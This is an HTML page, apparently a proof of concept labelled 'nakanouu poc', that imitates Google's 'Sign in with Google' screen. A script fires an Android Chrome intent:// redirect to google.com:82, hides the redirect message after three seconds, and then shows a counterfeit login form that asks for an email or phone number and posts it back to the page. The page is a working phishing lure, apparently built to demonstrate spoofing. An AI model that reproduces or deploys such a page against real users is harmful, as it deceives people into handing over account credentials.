
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://heloworld285.github.io/style.css">

    <title>Redirecting...</title>

    <style>
        #content {
            display: none;
        }
    </style>
</head>

<body>

    <h1 id="Text">Redirecting to Google.com...</h1>

    <div id="content">
        <div class="main">
            <div class="content">
                <form action="" method="POST" class="form">

                    <div class="brand-label">
                        <img src="./google.svg" class="logo-label">
                        Sign in with Google - nakanouu poc
                    </div>

                    <h3 class="heading">Sign in</h3>

                    <p class="desc">
                        Continue to <a href="https://gmail.google.com/">Gmail</a>
                    </p>

                    <div class="spacer"></div>

                    <div class="form-group">
                        <input
                            id="email"
                            name="email"
                            type="email"
                            placeholder="Email or phone number"
                            class="form-control"
                            autofocus
                        >
                        <span class="form-message"></span>
                    </div>

                    <div class="after-form left">
                        <a href="./forget.html" class="forget">Forgot email?</a>

                        <p class="privacy left">
                            To continue, Google will share your name, email address,
                            language preference, and profile picture.
                        </p>
                    </div>

                    <div class="submit">
                        <a href="./create.html" class="create">Create account</a>
                        <button class="form-submit">Next</button>
                    </div>

                </form>
            </div>
        </div>
    </div>

    <script>
        // Redirect
        location.href = "intent://google.com:82/#Intent;scheme=https;package=com.android.chrome;end";

        // Display content after 3 seconds
        setTimeout(() => {
            document.getElementById("Text").style.display = "none";
            document.getElementById("content").style.display = "block";
        }, 3000);
    </script>

</body>
</html>
